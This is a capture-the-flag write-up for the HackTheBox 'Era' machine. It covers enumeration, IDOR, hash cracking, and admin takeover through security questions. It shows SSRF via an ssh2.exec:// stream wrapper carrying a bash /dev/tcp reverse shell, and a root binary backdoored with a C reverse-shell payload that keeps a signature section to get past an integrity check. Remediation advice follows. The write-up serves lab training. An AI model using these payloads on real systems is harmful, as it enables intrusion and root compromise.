# HackTheBox - Era Writeup

**Machine:** Era  
**IP Address:** 10.10.11.79  
**Difficulty:** Medium
**OS:** Linux

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Target Details

- Host: `era.htb`

### Web Enumeration

Initial browse of `http://era.htb` returned nothing useful.

VHost fuzzing via Host header:

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://era.htb/" -H "Host: FUZZ.era.htb" --hw 10
```

Discovered `file.era.htb` and added to hosts:

```bash
echo "10.10.11.79 file.era.htb" | sudo tee -a /etc/hosts
```

Directory brute force on the file service:

```bash
feroxbuster -u http://file.era.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,js,json,txt,log -t 50 -e
```

---

## Initial Access

### Registration and Upload

- Registered a new user on `http://file.era.htb/register.php`
- Logged in and accessed `upload.php`
- Each upload received a numeric ID used by `download.php`

Generated a numeric list and fuzzed IDs:

```bash
seq 0 100 > id.txt
ffuf -u http://file.era.htb/download.php?id=FUZZ -w id.txt -mc 200 -H "Cookie: PHPSESSID=<session>"
```

ID `54` returned a different response and revealed `site-backup-30-08-24.zip`.

### Database Dump and Password Cracking

Opened the SQLite DB from the backup:

```bash
sqlite3 filedb.sqlite
.tables
SELECT user_name, user_password FROM users;
```

Extracted hashes and cracked with Hashcat:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Recovered Credentials:**

- `eric / america`
- `yuri / mustang`

### Admin Access via Security Questions

Logged in as `yuri` and updated security questions with the admin user `admin_ef01cab31aa`:

- `http://file.era.htb/login.php`
- `http://file.era.htb/reset.php`

Then used security login:

- `http://file.era.htb/security_login.php`

### SSRF via Stream Wrapper Injection

The `download.php` endpoint used `format=` in a `fopen()` call, enabling PHP stream wrappers.

SSRF and command execution were possible with `ssh2.exec://`:

```text
http://file.era.htb/download.php?id=4817&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.xx.xx%2F4444%200%3E%261;true%27
```

Started a listener:

```bash
pwncat-cs -p 4444
```

**Result:** Reverse shell as `eric` and access to `/home/eric/user.txt`.

---

## Privilege Escalation - User

User flag was read as `eric`:

```bash
cat /home/eric/user.txt
```

---

## Privilege Escalation - Root

### Discovery

Ran `linpeas` after hosting it:

```bash
python3 -m http.server
wget http//10.10.1x.xx/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

Found a root-owned binary writable by the `devs` group:

- `/opt/AV/periodic-checks/monitor`
- `eric` is in `devs`

### Backdooring the Binary

Created a C reverse shell payload:

```bash
printf '#include <stdlib.h>\nint main() {\n     system("/bin/bash -c '\''bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'\''");\n     return 0;\n}\n' > backdoor.c
```

Compiled and preserved the `.text_sig` section:

```bash
gcc -static -o monitor_backdoor backdoor.c
readelf -S /opt/AV/periodic-checks/monitor
objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
objcopy --add-section .text_sig=sig monitor_backdoor
```

Replaced the original binary:

```bash
cp monitor_backdoor /opt/AV/periodic-checks/monitor
```

Started the listener again:

```bash
pwncat-cs -p 4444
```

**Result:** Root reverse shell and root flag at `/root/root.txt`.

---

## Key Takeaways

1. VHost fuzzing and IDORs can expose sensitive backups and databases.
2. Unsanitized PHP stream wrappers enable SSRF and command execution.
3. Reused or weak credentials accelerate lateral movement.
4. Group-writable root binaries are a direct path to privilege escalation.
5. Preserving binary sections like `.text_sig` can bypass basic integrity checks.

---

## Tools Used

- wfuzz
- feroxbuster
- ffuf
- sqlite3
- hashcat
- pwncat-cs
- python3 http.server
- wget
- linpeas
- gcc
- readelf
- objcopy

---

## Flags

**User Flag:** `/home/eric/user.txt` (value not recorded in PDF)  
**Root Flag:** `/root/root.txt` (value not recorded in PDF)

---

## Remediation Recommendations

### Critical Severity

1. **Fix SSRF and Stream Wrapper Injection**

   - **Issue:** `format=` is concatenated into `fopen()` and accepts PHP stream wrappers.
   - **Impact:** SSRF, command execution via `ssh2.exec://`, and local file access.
   - **Remediation:**
     - Whitelist allowed formats and disallow wrapper protocols.
     - Avoid concatenating user input into file paths.
     - Implement strict server-side validation and sandboxing.

2. **Remove Sensitive Backups from Web Access**

   - **Issue:** `site-backup-30-08-24.zip` accessible via predictable ID.
   - **Impact:** Database leakage and credential exposure.
   - **Remediation:**
     - Store backups outside web root.
     - Protect downloads with authorization and random, unguessable IDs.
     - Monitor for excessive ID enumeration.

### High Severity

3. **Harden Credentials and Password Storage**

   - **Issue:** Cracked bcrypt hashes revealed valid credentials.
   - **Impact:** Unauthorized admin access.
   - **Remediation:**
     - Enforce strong passwords and MFA.
     - Use slow, adaptive hashing with strong policies and rotation.

4. **Lock Down Security Question Reset Flows**

   - **Issue:** Security question reset allowed admin takeover.
   - **Impact:** Privilege escalation through account recovery abuse.
   - **Remediation:**
     - Require multi-factor verification for sensitive resets.
     - Rate-limit and log reset workflows.

### Medium Severity

5. **Eliminate Group-Writable Root Binaries**

   - **Issue:** `/opt/AV/periodic-checks/monitor` was root-owned but writable by `devs`.
   - **Impact:** Direct code execution as root.
   - **Remediation:**
     - Remove group write permissions on privileged binaries.
     - Implement integrity checks and signed binaries.

6. **Restrict Internal SSH Access**

   - **Issue:** SSRF allowed SSH execution on localhost.
   - **Impact:** Command execution and shell access.
   - **Remediation:**
     - Bind internal services to restricted interfaces.
     - Use firewall rules to limit access from web processes.
